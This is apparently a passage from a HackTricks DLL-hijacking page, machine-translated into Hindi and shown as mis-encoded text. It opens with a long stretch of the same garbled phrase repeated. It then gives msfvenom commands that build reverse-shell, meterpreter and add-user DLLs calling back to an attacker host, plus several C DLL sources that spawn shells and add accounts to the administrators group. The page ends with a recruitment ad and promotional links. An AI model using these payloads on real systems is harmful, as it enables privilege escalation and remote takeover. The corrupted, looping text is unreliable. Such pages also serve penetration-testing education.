рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙрдЪреНрдЪ рд╕реЗ рдЙ
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**рдореАрдЯрд░рдкреНрд░реЗрдЯрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ (x86 рдореИрдВрдиреЗ x64 рд╕рдВрд╕реНрдХрд░рдг рдирд╣реАрдВ рджреЗрдЦрд╛):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### рдЕрдкрдирд╛

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рд╡рд╣ Dll рдЬрд┐рд╕реЗ рдЖрдк рдХрдВрдкрд╛рдЗрд▓ рдХрд░рддреЗ рд╣реИрдВ, **рдХрдИ рдлрд╝рдВрдХреНрд╢рди рдирд┐рд░реНрдпрд╛рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП** рдЬреЛ рдкреАрдбрд╝рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ, рдпрджрд┐ рдпреЗ рдлрд╝рдВрдХреНрд╢рди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИрдВ рддреЛ **рдмрд╛рдЗрдирд░реА рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдЧреА** рдФрд░ **рдЙрддреНрдкреАрдбрд╝рди рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛**ред
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## рд╕рдВрджрд░реНрдн
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

рдпрджрд┐ рдЖрдк **рд╣реИрдХрд┐рдВрдЧ рдХрд░рд┐рдпрд░** рдореЗрдВ рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рдФрд░ рдЕрдирд╣реИрдХреЗрдмрд▓ рдХреЛ рд╣реИрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ - **рд╣рдо рднрд░реНрддреА рдХрд░ рд░рд╣реЗ рд╣реИрдВ!** (_рдлреНрд▓реВрдПрдВрдЯ рдкреЛрд▓рд┐рд╢ рд▓рд┐рдЦрдиреЗ рдФрд░ рдмреЛрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
